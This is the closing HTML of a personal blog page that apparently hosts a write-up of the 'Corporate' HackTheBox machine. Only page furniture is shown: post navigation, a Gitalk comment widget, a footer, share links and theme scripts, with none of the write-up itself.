      <a href="/2024/01/08/Bizness-HackTheBox/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Bizness - HackTheBox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2023/12/11/Surveillance-HackTheBox/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">Surveillance - HackTheBox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'd35074a248599729ad26',
          clientSecret: 'd208d5902ab831ba7294f942046bcd8da954f9ff',
          repo: 'BlogComments',
          owner: 'zjicmDarkWing',
          admin: ['zjicmDarkWing'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
        </p>
    </div>
    <div class="bottom">
        <p><span>暗羽 &copy; 2014 - 2024</span>
            <span>
                
                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2023/12/19/Corporate-HackTheBox/&title=《Corporate - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2023/12/19/Corporate-HackTheBox/&title=《Corporate - HackTheBox》 — 喵喵喵喵&source=木を植える最も良い時期は、10年前である。次にいい時期は今である。" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2023/12/19/Corporate-HackTheBox/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Corporate - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2023/12/19/Corporate-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2023/12/19/Corporate-HackTheBox/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACMElEQVR42u3aQW6EMAwFUO5/abqt1BK+HaYVyctqRIHkTSWPE/s44nFejJ9/HV9JPn+/8vDAwMB4LeMcjvEE46eu7uzNezMLBgbGBoyricf35OE1CaPj99ysGQMDAyNYYh4ce4kjBgYGRpVRTQrHCeW/BVwMDIxXMZLNZC/g9rayH9yLY2BgvJCRn7r//eeP1DcwMDBexTiL46mC5VUgbq4KAwNjaUYe4GZSvV45s7weDAyMLRm9Q/9qUbMajpunhhgYGK9l5C+aCYu9trCkSPBLhouBgbEoIwmyMwXOJLjnyejRq5FiYGC8llE9PsuP1WbCdPNtGBgYGzPyoNlLNPMfgJuQjYGBsTSj2p5VneDZBoubpzAwMJZjzCw3X/R4ifk9l09hYGAszahuMufD5czSb57FwMDYgJGXCnrlgZkAXQi4GBgYyzHKbQ3F4FgtHjSvYGBgLM14qjAwU7yMfhPmmy0wMDCWYzy1scyvV5/FwMDYjZFP2QuFScBNSqfNzhEMDIwlGNXjrd7EybKm2jswMDC2YVS3lNVWsN7XFKWqGBgYmzF6S+8dwPUSTQwMjH0YZ3E8lsYVt83R/wEDA2NRxvyRWX6e1yuIJm1nGBgYOzDyIJund/PtX81NLAYGxtKMfNebFAPmE8dyQRQDAwOjFVLzwJ0sN2oIw8DAwChuaKvvzA/mLjexGBgYSzOq6V0eIp9qFLv5yjAwMJZmzHRqVNsykuO8vAUEAwNjA8YX9nqyUPEWBYAAAAAASUVORK5CYII=" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



<script>
(function() {
    var OriginTitile = document.title, titleTime;
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            document.title = '死鬼去哪里了！';
            clearTimeout(titleTime);
        } else {
            document.title = '(つェ⊂)咦!又好了!';
            titleTime = setTimeout(function() {
                document.title = OriginTitile;
            },2000);
        }
    });
})();
</script>



</body>
</html>
